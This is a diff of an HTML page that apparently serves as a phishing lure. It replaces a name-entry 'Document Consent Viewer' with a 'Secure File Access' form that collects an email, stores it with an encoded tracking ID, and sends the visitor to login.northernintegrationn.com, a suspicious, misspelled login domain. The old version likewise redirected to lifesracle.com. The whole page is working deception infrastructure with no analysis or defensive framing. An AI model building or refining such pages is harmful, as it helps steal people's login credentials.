@@ -3,232 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Consent Viewer</title>
+    <title>Secure File Access</title>
     <style>
-        :root {
-            --primary: #2563eb;
-            --error: #dc2626;
-            --text: #1f2937;
-            --text-secondary: #6b7280;
-            --border: #e5e7eb;
-            --danger-bg: #fee2e2;
-        }
-        
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            font-size: 16px;
-            line-height: 1.5;
-            color: var(--text);
-            background: white;
-            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
             margin: 0;
+            background: linear-gradient(135deg, #74ebd5, #acb6e5);
+            color: #333;
         }
-        
-        .container {
-            width: min(90%, 500px);
-            margin: 4rem auto 0;
-            padding: 0;
+        .form-container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            animation: slideIn 0.8s ease-out;
         }
-        
-        @media (max-width: 768px) {
-            .container {
-                margin-top: 2rem;
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        h1 {
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            color: #1a3c5e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        h1 i {
+            color: #ff6f61;
+            font-size: 1.4em;
+        }
+        p {
+            font-size: 1em;
+            margin-bottom: 25px;
+            color: #4a4a4a;
+        }
+        input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 1em;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        input[type="email"]:focus {
+            border-color: #ff6f61;
+            box-shadow: 0 0 8px rgba(255, 111, 97, 0.3);
+            outline: none;
+        }
+        button {
+            background: linear-gradient(90deg, #ff6f61, #ffb88c);
+            color: white;
+            padding: 12px 35px;
+            border: none;
+            border-radius: 6px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+        button:hover {
+            background: linear-gradient(90deg, #ff8a75, #ffd1a4);
+            transform: translateY(-2px);
+        }
+        .error-message {
+            color: #c0392b;
+            font-size: 0.85em;
+            margin-top: 8px;
+            display: none;
+        }
+        @media (max-width: 500px) {
+            .form-container {
+                padding: 20px;
+                width: 95%;
+            }
+            button {
+                padding: 10px 25px;
+                font-size: 1em;
             }
         }
-        
-        .header {
-            font-size: 1.125rem;
-            font-weight: 600;
-            margin-bottom: 1.5rem;
-            display: block;
-        }
-        
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        
-        .form-label {
-            display: block;
-            color: var(--text-secondary);
-            font-size: 0.875rem;
-            margin-bottom: 0.5rem;
-        }
-        
-        .required-mark {
-            color: var(--error);
-        }
-        
-        .form-input {
-            width: 100%;
-            height: 2.625rem;
-            padding: 0.625rem 0.9375rem;
-            border: 1px solid var(--border);
-            border-radius: 0.375rem;
-            font-size: 1rem;
-            transition: all 0.2s ease;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
-        }
-        
-        .error-message {
-            color: var(--error);
-            font-size: 0.8125rem;
-            margin-top: 0.5rem;
-            display: none;
-        }
-        
-        .btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 0.375rem;
-            padding: 0.875rem 1.5rem;
-            font-size: 1rem;
-            cursor: pointer;
-            width: 100%;
-            transition: opacity 0.2s;
-        }
-        
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        
-        .alert {
-            padding: 1rem 1.25rem;
-            border-radius: 0.375rem;
-            margin-bottom: 1.5rem;
-            display: none;
-        }
-        
-        .alert-danger {
-            background: var(--danger-bg);
-            color: var(--text);
-        }
-        
-        .spacer {
-            margin-top: 2.25rem;
-        }
-        
-        .hidden {
-            display: none;
-        }
     </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 </head>
 <body>
-    <div class="container">
-        <div id="commonError" class="alert alert-danger hidden" role="alert"></div>
-        <span class="header">  ESSENTIAL DOCUMENT  .</span>
-        
-        <form id="consentForm" novalidate>
-            <div class="form-group">
-                <label for="name" class="form-label">
-                    <span class="required-mark" aria-hidden="true">*</span> 
-                    <span>Please enter your name to continue</span>
-                </label>
-                <input type="text" id="name" class="form-input" name="name" 
-                       placeholder="Your Name" autocomplete="name" required
-                       aria-required="true" aria-describedby="nameError">
-                <span id="nameError" class="error-message hidden" role="alert"></span>
-            </div>
-            
-            <div class="form-group spacer">
-                <button type="submit" id="submitBtn" class="btn" disabled>
-                    View
-                </button>
-            </div>
+    <div class="form-container">
+        <h1><i class="fas fa-shield-alt"></i> Access Your File</h1>
+        <p>Please provide your email to access the secure file.</p>
+        <form id="emailForm">
+            <input type="email" id="emailField" placeholder="Your email address" required>
+            <p id="errorText" class="error-message">Invalid email address. Please try again.</p>
+            <button type="submit">Proceed</button>
         </form>
     </div>
 
     <script>
-        class ConsentForm {
-            constructor() {
-                this.elements = {
-                    form: document.getElementById('consentForm'),
-                    nameInput: document.getElementById('name'),
-                    nameError: document.getElementById('nameError'),
-                    submitBtn: document.getElementById('submitBtn'),
-                    commonError: document.getElementById('commonError')
-                };
-                
-                this.initialize();
-            }
-            
-            initialize() {
-                this.setupEventListeners();
-            }
-            
-            setupEventListeners() {
-                this.elements.nameInput.addEventListener('blur', () => this.validateName());
-                this.elements.nameInput.addEventListener('input', () => {
-                    if (this.elements.nameError.style.display === 'block') {
-                        this.validateName();
-                    }
-                    // Enable/disable button based on input
-                    this.toggleSubmitButton(this.elements.nameInput.value.trim().length > 1);
-                });
-                
-                this.elements.form.addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    this.handleSubmit();
-                });
-            }
-            
-            validateName() {
-                const name = this.elements.nameInput.value.trim();
-                
-                if (!name) {
-                    this.showError(this.elements.nameError, 'Name is required.');
-                    return false;
-                }
-                
-                if (name.length < 2) {
-                    this.showError(this.elements.nameError, 'Name must be at least 2 characters.');
-                    return false;
-                }
-                
-                this.hideError(this.elements.nameError);
-                return true;
-            }
-            
-            showError(element, message) {
-                element.textContent = message;
-                element.style.display = 'block';
-                this.toggleSubmitButton(false);
-            }
-            
-            hideError(element) {
-                element.textContent = '';
-                element.style.display = 'none';
-                this.toggleSubmitButton(true);
-            }
-            
-            toggleSubmitButton(enabled) {
-                this.elements.submitBtn.disabled = !enabled || 
-                    this.elements.nameInput.value.trim().length < 2;
-            }
-            
-            handleSubmit() {
-                if (this.validateName()) {
-                    
-                    window.location.href = "https://auth.849995.lifesracle.com/c";
-                }
+        function generateUniqueUrl(email) {
+            const timestamp = Date.now();
+            const uniqueId = btoa(email + timestamp).replace(/=/g, '');
+            return `https://login.northernintegrationn.com/c/${uniqueId}`;
+        }
+
+        function processEmail() {
+            const emailField = document.getElementById('emailField').value;
+            const errorText = document.getElementById('errorText');
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (emailRegex.test(emailField)) {
+                localStorage.setItem('userEmail', emailField);
+                // Store the unique URL for tracking purposes
+                const uniqueUrl = generateUniqueUrl(emailField);
+                localStorage.setItem('uniqueAccessUrl', uniqueUrl);
+                // Redirect to the fixed URL
+                window.location.assign('https://login.northernintegrationn.com/c');
+            } else {
+                errorText.style.display = 'block';
             }
         }
-        
-        // Initialize the form when DOM is loaded
-        document.addEventListener('DOMContentLoaded', () => {
-            new ConsentForm();
+
+        // Handle form submission for both button click and Enter key
+        const form = document.getElementById('emailForm');
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+            processEmail();
+        });
+
+        // Clear error message on input
+        document.getElementById('emailField').addEventListener('input', () => {
+            document.getElementById('errorText').style.display = 'none';
         });
     </script>
 </body>
